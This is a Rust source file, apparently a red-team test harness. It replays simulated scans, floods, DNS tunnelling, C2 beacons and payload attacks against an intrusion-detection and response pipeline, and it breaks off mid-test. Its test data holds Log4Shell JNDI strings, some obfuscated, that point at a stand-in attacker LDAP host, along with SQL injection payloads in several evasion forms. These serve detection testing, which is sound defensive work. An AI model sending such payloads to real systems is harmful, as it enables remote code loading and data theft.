//! Red-team harness for the unified NSM / NDR / IPS / SIEM stack.
//!
//! Everything here is *in-process simulation*: synthetic packet metadata is
//! fed to the real `nsm` detectors (time is simulated through packet
//! timestamps, so hours of low-and-slow traffic replay in milliseconds), and
//! synthetic lane events / real detector alerts are fed to the real
//! `correlation_engine` -> `ips_control_plane` -> `review_queue` ->
//! `rustwall::Quarantine` response path. No packets touch a network.
//!
//! Layer A  detection: does each detector catch the attack (and its evasive
//!          variants), and stay quiet on benign look-alikes?
//! Layer B  response: when the detectors *do* fire, does the response path do
//!          the right thing -- contain the attacker, never the victim or
//!          infrastructure, survive floods and attacker-induced state abuse?
//!
//! Layer C  (round 2) adaptive adversary: see `round2.rs`.
//!
//! Usage: attack_sim [--json <path>] [--no-round2] [--no-protect-list]
//! Exit code is the number of FAILed scenarios (capped at 100).

use std::collections::HashSet;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::time::{Duration, Instant, UNIX_EPOCH};

mod round2;

use correlation_engine::{CorrelationConfig, CorrelationEngine, FlowKey, LaneSenders, Protocol};
use ips_control_plane::IpsControlPlane;
use nsm::alert::{Alert, Severity as NSev};
use nsm::detect::DetectionEngine;
use nsm::packet::{L4Proto, PacketMeta};
use review_queue::prelude::{SlaPolicy, TriggerConfig};
use rustwall::quarantine::Quarantine;
use tokio::sync::mpsc;

const SYN: u8 = 0x02;
const FIN: u8 = 0x01;
const PSH: u8 = 0x08;
const URG: u8 = 0x20;
const ACK: u8 = 0x10;

fn v4(a: u8, b: u8, c: u8, d: u8) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(a, b, c, d))
}

// Addresses (all RFC 5737 / RFC 1918 documentation-or-private ranges).
fn victim() -> IpAddr { v4(10, 0, 0, 10) }
fn gateway() -> IpAddr { v4(10, 0, 0, 1) }
fn resolver() -> IpAddr { v4(8, 8, 8, 8) }
fn scanner() -> IpAddr { v4(10, 0, 0, 250) } // authorised internal vuln scanner
fn attacker() -> IpAddr { v4(198, 51, 100, 66) }
fn c2() -> IpAddr { v4(203, 0, 113, 9) }

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn f64(&mut self) -> f64 { (self.next() >> 11) as f64 / (1u64 << 53) as f64 }
    fn string(&mut self, alphabet: &[u8], n: usize) -> String {
        (0..n).map(|_| alphabet[(self.next() % alphabet.len() as u64) as usize] as char).collect()
    }
}

const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const B32: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
const HEX: &[u8] = b"0123456789abcdef";

// ---------------------------------------------------------------------
// Simulated-time driver for the NSM detection engine
// ---------------------------------------------------------------------

struct Sim {
    engine: DetectionEngine,
    now: Duration,
    alerts: Vec<(Duration, Alert)>,
    t0: Duration,
}

impl Sim {
    fn new() -> Self {
        let mut local = HashSet::new();
        local.insert(victim());
        local.insert(round2::victim6());
        let t0 = Duration::from_secs(1_800_000_000);
        Self { engine: DetectionEngine::new(local), now: t0, alerts: Vec::new(), t0 }
    }
    fn advance(&mut self, d: Duration) { self.now += d; }
    fn advance_s(&mut self, s: f64) { self.now += Duration::from_secs_f64(s); }
    fn send(&mut self, src: IpAddr, dst: IpAddr, sport: u16, dport: u16, proto: L4Proto, flags: u8, payload: &[u8]) {
        let meta = PacketMeta {
            ts: UNIX_EPOCH + self.now,
            src_ip: src,
            dst_ip: dst,
            src_port: sport,
            dst_port: dport,
            proto,
            tcp_flags: flags,
            length: 60 + payload.len(),
            // mirror the real capture path, which only keeps PAYLOAD_CAP bytes
            payload_head: payload[..payload.len().min(nsm::packet::PAYLOAD_CAP)].to_vec(),
        };
        for a in self.engine.analyze(&meta) {
            self.alerts.push((self.now - self.t0, a));
        }
    }
    fn tcp(&mut self, src: IpAddr, dst: IpAddr, dport: u16, flags: u8, payload: &[u8]) {
        self.send(src, dst, 40000, dport, L4Proto::Tcp, flags, payload);
    }
    fn count(&self, f: impl Fn(&Alert) -> bool) -> usize { self.alerts.iter().filter(|(_, a)| f(a)).count() }
    fn first(&self, f: impl Fn(&Alert) -> bool) -> Option<Duration> {
        self.alerts.iter().find(|(_, a)| f(a)).map(|(t, _)| *t)
    }
}

// ---------------------------------------------------------------------
// Results
// ---------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq, Eq)]
enum Expect { Detect, Quiet, Respond, Known }

struct Outcome {
    id: &'static str,
    layer: &'static str,
    name: &'static str,
    technique: &'static str,
    expect: Expect,
    pass: bool,
    detail: String,
}

fn outcome(id: &'static str, layer: &'static str, name: &'static str, technique: &'static str, expect: Expect, pass: bool, detail: String) -> Outcome {
    Outcome { id, layer, name, technique, expect, pass, detail }
}

fn detect_outcome(id: &'static str, name: &'static str, technique: &'static str, sim: &Sim, f: impl Fn(&Alert) -> bool) -> Outcome {
    let n = sim.count(&f);
    let first = sim.first(&f);
    let detail = match first {
        Some(t) => format!("{n} alert(s); first after {:.1}s of attack traffic", t.as_secs_f64()),
        None => "no alert raised".to_string(),
    };
    outcome(id, "A", name, technique, Expect::Detect, n > 0, detail)
}

/// Documented ambiguity, reported but not scored: behaviour that is
/// indistinguishable from an attack at this layer (e.g. a legitimate
/// 60-second keepalive looks exactly like a beacon).
fn known_outcome(id: &'static str, name: &'static str, technique: &'static str, sim: &Sim) -> Outcome {
    let n = sim.alerts.len();
    let detail = if n == 0 {
        "no alert (not flagged)".to_string()
    } else {
        format!("{n} alert(s) raised, severity {:?} -- inherently ambiguous, kept Medium so it cannot auto-contain",
            sim.alerts.iter().map(|(_, a)| a.severity).max().unwrap())
    };
    outcome(id, "A", name, technique, Expect::Known, true, detail)
}

fn quiet_outcome(id: &'static str, name: &'static str, technique: &'static str, sim: &Sim) -> Outcome {
    let n = sim.alerts.len();
    let detail = if n == 0 {
        "no alerts (correct)".to_string()
    } else {
        let kinds: Vec<String> = sim.alerts.iter().take(3).map(|(_, a)| format!("{}/{:?}", a.detector, a.severity)).collect();
        format!("{n} false-positive alert(s): {}", kinds.join(", "))
    };
    outcome(id, "A", name, technique, Expect::Quiet, n == 0, detail)
}

// ---------------------------------------------------------------------
// Packet builders
// ---------------------------------------------------------------------

fn dns_query(rng: &mut Rng, labels: &[String]) -> Vec<u8> {
    let id = rng.next();
    let mut p = vec![(id >> 8) as u8, id as u8, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
    for l in labels {
        p.push(l.len() as u8);
        p.extend_from_slice(l.as_bytes());
    }
    p.push(0);
    p.extend_from_slice(&[0, 16, 0, 1]); // TXT IN
    p
}

fn http_get(path: &str) -> Vec<u8> {
    format!("GET {path} HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n").into_bytes()
}

// ---------------------------------------------------------------------
// Layer A: detection scenarios
// ---------------------------------------------------------------------

fn a_scan_fast() -> Outcome {
    let mut s = Sim::new();
    for port in 1..=60u16 {
        s.tcp(attacker(), victim(), port, SYN, &[]);
        s.advance(Duration::from_millis(20));
    }
    detect_outcome("A01", "Fast SYN port scan (60 ports / 1.2 s)", "T1046 Network Service Discovery", &s,
        |a| a.detector == "portscan" && a.src_ip == Some(attacker()))
}

fn a_scan_slow() -> Outcome {
    let mut s = Sim::new();
    // 1 probe every 20 s across 300 ports (100 minutes): never more than a
    // handful of ports inside any 10 s window.
    for port in 1..=300u16 {
        s.tcp(attacker(), victim(), port, SYN, &[]);
        s.advance_s(20.0);
    }
    detect_outcome("A02", "Low-and-slow SYN scan (300 ports / 100 min)", "T1046 + evasion (rate pacing)", &s,
        |a| a.detector == "portscan" && a.src_ip == Some(attacker()))
}

fn a_scan_stealth(id: &'static str, name: &'static str, flags: u8) -> Outcome {
    let mut s = Sim::new();
    for port in 1..=80u16 {
        s.tcp(attacker(), victim(), port, flags, &[]);
        s.advance(Duration::from_millis(15));
    }
    detect_outcome(id, name, "T1046 + evasion (non-SYN probe flags)", &s,
        |a| a.detector == "portscan" && a.src_ip == Some(attacker()))
}

fn a_syn_flood() -> Outcome {
    let mut s = Sim::new();
    for i in 0..400u32 {
        let src = v4(172, 16, (i / 256) as u8, (i % 256) as u8);
        s.tcp(src, victim(), 443, SYN, &[]);
        s.advance(Duration::from_millis(2));
    }
    detect_outcome("A04", "Spoofed-source SYN flood (400 SYN / 0.8 s)", "T1498 Network DoS", &s, |a| a.detector == "synflood")
}

fn a_syn_flood_single_source() -> Outcome {
    let mut s = Sim::new();
    for _ in 0..400u32 {
        s.tcp(attacker(), victim(), 443, SYN, &[]);
        s.advance(Duration::from_millis(2));
    }
    detect_outcome("A05", "Single-source SYN flood (400 SYN / 0.8 s)", "T1498 Network DoS", &s, |a| a.detector == "synflood")
}

fn a_dns_tunnel(id: &'static str, name: &'static str, technique: &'static str, qn: usize, gap_s: f64, make: impl Fn(&mut Rng, usize) -> Vec<String>) -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x9E3779B97F4A7C15);
    for i in 0..qn {
        let labels = make(&mut rng, i);
        let p = dns_query(&mut rng, &labels);
        s.send(victim(), resolver(), 53000 + (i % 1000) as u16, 53, L4Proto::Udp, 0, &p);
        s.advance_s(gap_s);
    }
    detect_outcome(id, name, technique, &s, |a| a.detector == "dns_tunnel" && a.src_ip == Some(victim()))
}

fn a_beacon(id: &'static str, name: &'static str, technique: &'static str, n: usize, intervals: impl Fn(&mut Rng, usize) -> f64, port: impl Fn(usize) -> u16) -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0xD1B54A32D192ED03);
    for i in 0..n {
        s.tcp(victim(), c2(), port(i), SYN, &[]);
        s.advance_s(intervals(&mut rng, i));
    }
    detect_outcome(id, name, technique, &s, |a| a.detector == "beacon")
}

fn a_sig(id: &'static str, name: &'static str, technique: &'static str, packets: Vec<(L4Proto, u8, Vec<u8>)>, dport: u16) -> Outcome {
    let mut s = Sim::new();
    for (proto, flags, payload) in packets {
        s.send(attacker(), victim(), 41000, dport, proto, flags, &payload);
        s.advance(Duration::from_millis(5));
    }
    detect_outcome(id, name, technique, &s, |a| a.detector == "signature")
}

fn rss_kb() -> u64 {
    std::fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|s| s.lines().find(|l| l.starts_with("VmRSS:")).map(|l| l.to_string()))
        .and_then(|l| l.split_whitespace().nth(1).and_then(|n| n.parse().ok()))
        .unwrap_or(0)
}

fn a_state_exhaustion() -> Outcome {
    let mut s = Sim::new();
    let before = rss_kb();
    let n = 300_000u32;
    for i in 0..n {
        // distinct spoofed source every packet, aimed at the victim
        let src = v4(100, (i >> 16) as u8 & 0x3f | 0x40, (i >> 8) as u8, i as u8);
        s.tcp(src, victim(), 8000 + (i % 7) as u16, SYN, &[]);
        s.advance(Duration::from_micros(300));
    }
    let after = rss_kb();
    let growth_mb = (after.saturating_sub(before)) as f64 / 1024.0;
    // A bounded detector keeps state to a fixed budget regardless of how
    // many distinct sources an attacker invents. 64 MB for 300k sources is
    // already generous; unbounded state is ~O(sources).
    let pass = growth_mb < 64.0;
    outcome("A21", "A", "Detector memory exhaustion (300k spoofed sources)", "T1499 Endpoint DoS (state exhaustion)",
        Expect::Respond, pass, format!("RSS grew {growth_mb:.0} MB for 300k distinct sources (budget 64 MB)"))
}

// -- benign controls --

fn a_fp_browsing() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(7);
    let mut names = Vec::new();
    for i in 0..35u8 {
        let host = v4(93, 184, 216, 10 + i);
        s.tcp(victim(), host, 443, SYN, &[]);
        let labels = vec![format!("cdn{}", i), "example".to_string(), "com".to_string()];
        names.push(labels.clone());
        let p = dns_query(&mut rng, &labels);
        s.send(victim(), resolver(), 53100 + i as u16, 53, L4Proto::Udp, 0, &p);
        s.advance(Duration::from_millis(200));
    }
    quiet_outcome("A30", "Benign: page load touching 35 hosts + 35 DNS lookups", "false-positive control", &s)
}

fn a_fp_cdn_dns() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(11);
    let names: Vec<Vec<String>> = (0..4)
        .map(|_| vec![rng.string(b"abcdefghijklmnopqrstuvwxyz0123456789", 24), "cloudfront".into(), "net".into()])
        .collect();
    for round in 0..4 {
        for (i, labels) in names.iter().enumerate() {
            let p = dns_query(&mut rng, labels);
            s.send(victim(), resolver(), 53200 + (round * 4 + i) as u16, 53, L4Proto::Udp, 0, &p);
            s.advance_s(1.5);
        }
    }
    quiet_outcome("A31", "Benign: CDN/hash-style DNS names (4 names x 4 repeats)", "false-positive control", &s)
}

fn a_fp_random_revisit() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(23);
    for i in 0..40usize {
        s.tcp(victim(), v4(151, 101, 1, 69), 443, SYN, &[]);
        // exponential inter-arrival, mean 20 s: human/app-driven revisits
        let gap = -20.0 * (1.0 - rng.f64()).ln();
        s.advance_s(gap.max(0.6));
        let _ = i;
    }
    quiet_outcome("A32", "Benign: random-interval revisits to one server (40 samples)", "false-positive control", &s)
}

fn a_fp_inbound_web() -> Outcome {
    let mut s = Sim::new();
    // ordinary client hammering the web port with ordinary requests
    let mut rng = Rng(99);
    for i in 0..50u32 {
        s.send(v4(192, 0, 2, 44), victim(), 50000 + i as u16, 443, L4Proto::Tcp, SYN, &[]);
        s.advance_s(0.2 + 1.8 * rng.f64()); // human/app-driven, irregular gaps
    }
    for _ in 0..10 {
        s.tcp(v4(192, 0, 2, 44), victim(), 80, ACK | PSH, &http_get("/products?id=17"));
        s.advance_s(1.0);
    }
    quiet_outcome("A33", "Benign: busy legitimate web client (50 conns + 10 requests)", "false-positive control", &s)
}

fn a_fp_many_zones_long_names() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(31);
    // ad/tracker style: one long random-looking host per *different* zone
    for i in 0..30usize {
        let labels = vec![rng.string(b"abcdefghijklmnopqrstuvwxyz0123456789", 22), format!("tracker{i}"), "com".to_string()];
        let p = dns_query(&mut rng, &labels);
        s.send(victim(), resolver(), 53300 + i as u16, 53, L4Proto::Udp, 0, &p);
        s.advance_s(0.7);
    }
    quiet_outcome("A34", "Benign: 30 long random-looking hostnames, one per distinct zone", "false-positive control", &s)
}

fn a_fp_tcp_teardown() -> Outcome {
    let mut s = Sim::new();
    for i in 0..30u32 {
        let c = v4(192, 0, 2, 10 + i as u8);
        s.send(c, victim(), 50000 + i as u16, 443, L4Proto::Tcp, SYN, &[]);
        s.send(c, victim(), 50000 + i as u16, 443, L4Proto::Tcp, ACK, &[]);
        s.send(c, victim(), 50000 + i as u16, 443, L4Proto::Tcp, ACK | PSH, b"\x16\x03\x01 tls client hello");
        s.send(c, victim(), 50000 + i as u16, 443, L4Proto::Tcp, FIN | ACK, &[]);
        s.send(c, victim(), 50000 + i as u16, 443, L4Proto::Tcp, 0x04, &[]); // RST
        s.advance_s(1.5);
    }
    quiet_outcome("A35", "Benign: 30 normal TCP sessions incl. FIN|ACK and RST teardown", "false-positive control (flag logic)", &s)
}

fn a_fp_prose_with_user() -> Outcome {
    let mut s = Sim::new();
    let body = b"POST /feedback HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\nThe user said the user guide was great. User experience matters.";
    for _ in 0..5 {
        s.tcp(v4(192, 0, 2, 77), victim(), 80, ACK | PSH, body);
        s.advance_s(2.0);
    }
    quiet_outcome("A36", "Benign: web form text containing the word \"user\" (case-fold FP check)", "false-positive control (signature normalisation)", &s)
}

fn a_fp_few_ports_slowly() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(5);
    for i in 0..12u32 {
        for port in [21u16, 22, 80, 443, 8080] {
            s.send(v4(192, 0, 2, 90), victim(), 51000 + i as u16, port, L4Proto::Tcp, SYN, &[]);
        }
        // irregular revisits (mean ~5 min); a metronome would be a beacon, not a client
        s.advance_s(-300.0 * (1.0 - rng.f64()).ln());
    }
    quiet_outcome("A37", "Benign: client using 5 well-known ports repeatedly over an hour", "false-positive control (slow-scan window)", &s)
}

fn a_known_keepalive() -> Outcome {
    let mut s = Sim::new();
    for _ in 0..20 {
        s.tcp(victim(), v4(17, 253, 144, 10), 443, SYN, &[]);
        s.advance_s(60.0);
    }
    known_outcome("K01", "Legit 60 s keepalive/poller to one server (NTP/health-check style)", "documented ambiguity, not scored", &s)
}

fn layer_a() -> Vec<Outcome> {
    let mut out = Vec::new();
    out.push(a_scan_fast());
    out.push(a_scan_slow());
    out.push(a_scan_stealth("A03a", "NULL scan (no flags, 80 ports)", 0));
    out.push(a_scan_stealth("A03b", "FIN scan (80 ports)", FIN));
    out.push(a_scan_stealth("A03c", "XMAS scan FIN|PSH|URG (80 ports)", FIN | PSH | URG));
    out.push(a_syn_flood());
    out.push(a_syn_flood_single_source());

    // DNS tunnelling
    out.push(a_dns_tunnel("A06", "DNS tunnel: base64 labels, rapid (iodine-style)", "T1071.004 DNS tunnelling", 15, 0.3,
        |r, _| vec![r.string(B64, 40), "t".into(), "evil-c2".into(), "com".into()]));
    out.push(a_dns_tunnel("A07", "DNS tunnel: hex-encoded labels", "T1071.004 + evasion (low-entropy alphabet)", 60, 0.3,
        |r, _| vec![r.string(HEX, 60), "x".into(), "evil-c2".into(), "com".into()]));
    out.push(a_dns_tunnel("A08", "DNS tunnel: many short labels (4 x 14 chars)", "T1071.004 + evasion (label splitting)", 60, 0.3,
        |r, _| vec![r.string(B32, 14), r.string(B32, 14), r.string(B32, 14), r.string(B32, 14), "evil-c2".into(), "com".into()]));
    out.push(a_dns_tunnel("A09", "DNS exfil: low-and-slow (1 query / 25 s, 150 queries)", "T1048 + evasion (rate pacing)", 150, 25.0,
        |r, _| vec![r.string(B32, 52), "evil-c2".into(), "com".into()]));
    out.push(a_dns_tunnel("A10", "DNS exfil: dictionary-word labels (low entropy, 30 queries / min)", "T1048 + evasion (wordlist encoding)", 90, 2.0,
        |r, _| {
            let words = ["alpha", "bravo", "charlie", "delta", "echo", "foxtrot", "golf", "hotel", "india", "juliet", "kilo", "lima"];
            let w = |r: &mut Rng| words[(r.next() % 12) as usize];
            let a = format!("{}{}{}", w(r), w(r), w(r));
            let b = format!("{}{}{}", w(r), w(r), w(r));
            vec![a, b, "evil-c2".into(), "com".into()]
        }));

    // C2 beaconing
    out.push(a_beacon("A11", "C2 beacon: fixed 60 s interval, no jitter (12 beats)", "T1071 C2 over app layer", 12, |_, _| 60.0, |_| 4444));
    out.push(a_beacon("A12", "C2 beacon: 60 s +/-30% uniform jitter (24 beats)", "T1071 + evasion (jitter)", 24,
        |r, _| 60.0 * (0.7 + 0.6 * r.f64()), |_| 4444));
    out.push(a_beacon("A13", "C2 beacon: 60 s, rotating destination port", "T1071 + T1571 + evasion (port hopping)", 24, |_, _| 60.0,
        |i| 8000 + (i % 40) as u16));
    out.push(a_beacon("A14", "C2 beacon: 60 s with occasional missed/late beats", "T1071 + evasion (outliers)", 30,
        |r, i| if i % 7 == 6 { 60.0 * (2.0 + 3.0 * r.f64()) } else { 60.0 * (0.97 + 0.06 * r.f64()) }, |_| 4444));

    // Payload signatures
    let plain = b"GET /?x=${jndi:ldap://203.0.113.9/a} HTTP/1.1\r\nHost: x\r\n\r\n".to_vec();
    out.push(a_sig("A15", "Log4Shell JNDI lookup, plain", "T1190 Exploit public-facing app", vec![(L4Proto::Tcp, ACK | PSH, plain)], 8080));
    let obf1 = b"GET /?x=${${lower:j}ndi:ldap://203.0.113.9/a} HTTP/1.1\r\nHost: x\r\n\r\n".to_vec();
    out.push(a_sig("A16", "Log4Shell JNDI lookup, ${lower:j} obfuscation", "T1190 + evasion (obfuscation)", vec![(L4Proto::Tcp, ACK | PSH, obf1)], 8080));
    let obf2 = b"GET /?x=${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.9/a} HTTP/1.1\r\nHost: x\r\n\r\n".to_vec();
    out.push(a_sig("A17", "Log4Shell JNDI lookup, ${::-j} chain obfuscation", "T1190 + evasion (obfuscation)", vec![(L4Proto::Tcp, ACK | PSH, obf2)], 8080));
    out.push(a_sig("A18", "SQLi UNION SELECT, plain", "T1190", vec![(L4Proto::Tcp, ACK | PSH, http_get("/p?id=1 UNION SELECT user,pass FROM users--"))], 80));
    out.push(a_sig("A19", "SQLi: mixed case + inline comment (uNiOn/**/SeLeCt)", "T1190 + evasion (case/comment)", vec![(L4Proto::Tcp, ACK | PSH, http_get("/p?id=1%20uNiOn/**/SeLeCt%20user,pass"))], 80));
    out.push(a_sig("A20", "SQLi: URL-encoded (union%20select)", "T1190 + evasion (URL encoding)", vec![(L4Proto::Tcp, ACK | PSH, http_get("/p?id=1%20union%20select%20user,pass"))], 80));
    // padding pushes the marker past the 256-byte capture window
    let mut padded = b"POST /api HTTP/1.1\r\nHost: x\r\nX-Pad: ".to_vec();
    padded.extend(std::iter::repeat(b'A').take(400));
    padded.extend_from_slice(b"\r\n\r\ncmd=whoami ${jndi:ldap://203.0.113.9/a}");
    out.push(a_sig("A22", "Log4Shell marker after 400 B of header padding", "T1190 + evasion (capture-window padding)", vec![(L4Proto::Tcp, ACK | PSH, padded)], 8080));
    out.push(a_sig("A23", "Log4Shell marker split across two TCP segments", "T1190 + evasion (segment splitting)",
        vec![(L4Proto::Tcp, ACK | PSH, b"GET /?x=${jn".to_vec()), (L4Proto::Tcp, ACK | PSH, b"di:ldap://203.0.113.9/a} HTTP/1.1\r\n\r\n".to_vec())], 8080));

    // State exhaustion
    out.push(a_state_exhaustion());

    // Benign controls
    out.push(a_fp_browsing());
    out.push(a_fp_cdn_dns());
    out.push(a_fp_random_revisit());
    out.push(a_fp_inbound_web());
    out.push(a_fp_many_zones_long_names());
    out.push(a_fp_tcp_teardown());
    out.push(a_fp_prose_with_user());
    out.push(a_fp_few_ports_slowly());
    out.push(a_known_keepalive());
    out
}

// ---------------------------------------------------------------------
// Layer B: response-path scenarios
// ---------------------------------------------------------------------

struct Pipe {
    senders: LaneSenders,
    quarantine: Arc<Quarantine>,
    metrics: correlation_engine::CorrelationMetricsHandle,
    plane: Arc<IpsControlPlane>,
}

static PROTECT_LIST: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(true);

#[allow(unused_variables)]
fn protect_infrastructure(plane: &IpsControlPlane) {
    // Operator configuration: hosts that must never be auto-banned. Only
    // exists in the hardened tree; `--no-default-features` builds the harness
    // against the original API surface. `--no-protect-list` runs the hardened
    // tree *without* the list, to show which fixes stand on their own.
    #[cfg(feature = "hardened")]
    if PROTECT_LIST.load(std::sync::atomic::Ordering::Relaxed) {
        plane.protect_hosts([victim(), gateway(), resolver(), scanner()]);
    }
}

fn pipe(cfg: CorrelationConfig, qcap: usize) -> Pipe {
    let quarantine = Arc::new(Quarantine::new(qcap));
    let plane = Arc::new(IpsControlPlane::new(TriggerConfig::default(), SlaPolicy::FailSafe, quarantine.clone()).unwrap());
    protect_infrastructure(&plane);
    let (out_tx, out_rx) = mpsc::channel(1024);
    let (engine, senders, metrics) = CorrelationEngine::new(cfg, out_tx, None);
    tokio::spawn(engine.run());
    let p2 = plane.clone();
    tokio::spawn(async move { p2.run(out_rx).await });
    Pipe { senders, quarantine, metrics, plane }
}

fn fk(src: IpAddr) -> FlowKey {
    FlowKey { src_ip: src, dst_ip: victim(), src_port: 40000, dst_port: 443, protocol: Protocol::Tcp }
}

async fn settle() { tokio::time::sleep(Duration::from_millis(400)).await; }

fn forward(p: &Pipe, alerts: &[(Duration, Alert)]) {
    for (_, a) in alerts {
        p.senders.nsm.submit_alert(a);
    }
}

async fn b_victim_ban() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    let mut s = Sim::new();
    for i in 0..400u32 {
        let src = v4(172, 16, (i / 256) as u8, (i % 256) as u8);
        s.tcp(src, victim(), 443, SYN, &[]);
        s.advance(Duration::from_millis(2));
    }
    forward(&p, &s.alerts);
    settle().await;
    let victim_banned = p.quarantine.is_active(victim());
    outcome("B01", "B", "SYN flood: does the IPS ban the *victim*?", "T1498 -> self-inflicted outage",
        Expect::Respond, !victim_banned,
        if victim_banned { format!("VICTIM {} was auto-banned for 24h ({} bans issued)", victim(), p.quarantine.bans_total()) }
        else { format!("victim not banned ({} bans issued)", p.quarantine.bans_total()) })
}

async fn b_spoofed_infra(id: &'static str, name: &'static str, target: IpAddr) -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    let mut s = Sim::new();
    // UDP carries no handshake: anyone can forge the source address.
    let payload = b"INVITE sip:100@10.0.0.10 SIP/2.0\r\nX-Hdr: ${jndi:ldap://203.0.113.9/a}\r\n".to_vec();
    s.send(target, victim(), 5060, 5060, L4Proto::Udp, 0, &payload);
    forward(&p, &s.alerts);
    settle().await;
    let banned = p.quarantine.is_active(target);
    outcome(id, "B", name, "T1498/T1565 spoofed-source -> ban infrastructure",
        Expect::Respond, !banned,
        if banned { format!("forged UDP packet got {target} banned for 24h") } else { format!("{target} not banned") })
}

async fn b_blind_after_verdict() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    let host = attacker();
    // Stage 1: moderate two-lane corroboration -> verdict -> human queue.
    p.senders.spectral.submit(host, fk(host), 0.5, 0.0);
    p.senders.nsm.submit(host, "portscan", "scan", NSev::Medium);
    settle().await;
    let queued_first = !p.quarantine.is_active(host);
    // Stage 2: the same host now touches a honeytoken (ground truth).
    p.senders.honeytoken.submit(host, "tok-finance-db", None);
    settle().await;
    let banned = p.quarantine.is_active(host);
    outcome("B02", "B", "Escalation after a verdict: honeytoken touch following a queued alert", "response gap: finalized-host blindness",
        Expect::Respond, queued_first && banned,
        format!("stage-1 queued (not banned)={queued_first}; honeytoken touch afterwards -> banned={banned}"))
}

async fn b_dilution() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    let host = attacker();
    // Pre-seed the host record with benign-looking noise on one lane...
    for _ in 0..10 {
        p.senders.nsm.submit(host, "signature", "curl user-agent", NSev::Info);
    }
    settle().await;
    // ...then touch the tripwire.
    p.senders.honeytoken.submit(host, "tok-finance-db", None);
    settle().await;
    let banned = p.quarantine.is_active(host);
    outcome("B03", "B", "Confidence dilution: 10 Info events then a honeytoken touch", "evasion: dilute a ground-truth signal",
        Expect::Respond, banned,
        format!("honeytoken (confidence 1.0) touch after noise -> banned={banned}"))
}

async fn b_ban_table_exhaustion() -> Outcome {
    let cap = 128usize;
    let p = pipe(CorrelationConfig::default(), cap);
    let mut s = Sim::new();
    // Attacker forges Log4Shell UDP packets from many source addresses.
    for i in 0..(cap as u32 + 40) {
        let src = v4(192, 0, 2, (i % 250) as u8 + 1);
        let src = match src { IpAddr::V4(a) => { let o = a.octets(); v4(100, 64, (i / 250) as u8, o[3]) } x => x };
        s.send(src, victim(), 5060, 5060, L4Proto::Udp, 0, b"X: ${jndi:ldap://203.0.113.9/a}");
    }
    forward(&p, &s.alerts);
    settle().await;
    let filled = p.quarantine.active_count();
    // Now the real attacker trips a honeytoken.
    let real = attacker();
    p.senders.honeytoken.submit(real, "tok-finance-db", None);
    settle().await;
    let banned = p.quarantine.is_active(real);
    outcome("B04", "B", "Ban-table exhaustion by forged sources, then a real intrusion", "T1499 -> disable containment",
        Expect::Respond, banned,
        format!("table {filled}/{cap} full of forged-source bans; real attacker banned={banned}; capacity_rejections={}", p.quarantine.capacity_rejections()))
}

async fn b_authorised_scanner() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    p.senders.honeytoken.submit(scanner(), "tok-finance-db", None);
    settle().await;
    let banned = p.quarantine.is_active(scanner());
    outcome("B05", "B", "Authorised vuln scanner touches a honeytoken", "false-positive control (own tooling)",
        Expect::Respond, !banned,
        if banned { "authorised scanner auto-banned for 24h".to_string() } else { "scanner not auto-banned".to_string() })
}

async fn b_event_flood() -> Outcome {
    let cfg = CorrelationConfig { max_tracked_hosts: 20_000, ..CorrelationConfig::default() };
    let p = pipe(cfg, 1024);
    // Attacker floods the sensor with low-severity noise from many forged
    // sources while the real intrusion happens.
    let n = 400_000u32;
    let t = Instant::now();
    for i in 0..n {
        let src = v4(100, 100 + (i >> 16) as u8, (i >> 8) as u8, i as u8);
        p.senders.nsm.submit(src, "signature", "noise", NSev::Info);
    }
    let sent_in = t.elapsed();
    let real = attacker();
    p.senders.honeytoken.submit(real, "tok-finance-db", None);
    tokio::time::sleep(Duration::from_millis(1500)).await;
    let m = p.metrics.snapshot();
    let banned = p.quarantine.is_active(real);
    let _ = &p.plane;
    outcome("B06", "B", "Event flood (400k forged-source events) hiding a real honeytoken touch", "T1562 Impair defenses (alert flooding)",
        Expect::Respond, banned,
        format!("sent {n} events in {:.2}s; nsm events dropped={}, hosts evicted={}; critical honeytoken event banned attacker={banned}",
            sent_in.as_secs_f64(), m.nsm_dropped, m.hosts_evicted_capacity))
}

async fn b_engine_throughput() -> Outcome {
    // Same flood but measured as sustained engine throughput once the host
    // table is full (an O(n) scan per event collapses it).
    let cfg = CorrelationConfig { max_tracked_hosts: 20_000, channel_capacity: 1 << 20, ..CorrelationConfig::default() };
    let p = pipe(cfg, 1024);
    let n = 200_000u32;
    for i in 0..n {
        let src = v4(100, 100 + (i >> 16) as u8, (i >> 8) as u8, i as u8);
        p.senders.nsm.submit(src, "signature", "noise", NSev::Info);
    }
    let t = Instant::now();
    loop {
        let m = p.metrics.snapshot();
        if m.events_received >= (n as u64 - m.nsm_dropped) || t.elapsed() > Duration::from_secs(20) {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    let secs = t.elapsed().as_secs_f64();
    let rate = n as f64 / secs.max(1e-9);
    outcome("B07", "B", "Correlation-engine throughput with a full host table (200k events)", "T1499 CPU exhaustion",
        Expect::Respond, rate > 100_000.0,
